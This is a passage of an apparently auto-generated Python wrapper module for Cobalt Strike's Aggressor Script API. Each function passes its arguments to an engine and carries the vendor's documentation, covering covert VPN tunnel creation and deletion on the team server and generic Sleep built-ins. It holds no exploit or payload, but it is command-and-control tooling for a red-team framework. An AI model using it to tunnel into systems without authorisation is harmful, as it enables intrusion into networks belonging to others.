        Create a Covert VPN interface on the team server system.
        Arguments
        $1 - the interface name (e.g., phear0)
        $2 - the MAC address ($null will make a random MAC address)
        $3 - reserved; use $null for now.
        $4 - the port to bind the VPN's channel to
        $5 - the type of channel [bind, http, icmp, reverse, udp]
        Example
        
        vpn_tap_create("phear0", $null, $null, 7324, "udp");
        
    """

    return engine.call('vpn_tap_create', args, fork=fork)


def vpn_tap_delete(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Destroy a Covert VPN interface
        Arguments
        $1 - the interface name (e.g., phear0)
        Example
        
        vpn_tap_destroy("phear0");
        
    """

    return engine.call('vpn_tap_delete', args, fork=fork)


def print(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('print', args, fork=fork)


def println(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('println', args, fork=fork)


def printAll(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('printAll', args, fork=fork)


def warn(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('warn', args, fork=fork)


def debug(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('debug', args, fork=fork)


def command(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('command', args, fork=fork)


def cast(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('cast', args, fork=fork)


def casti(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('casti', args, fork=fork)


def typeOf(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('typeOf', args, fork=fork)


def exit(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('exit', args, fork=fork)


def systemProperties(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('systemProperties', args, fork=fork)


def cwd(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('cwd', args, fork=fork)

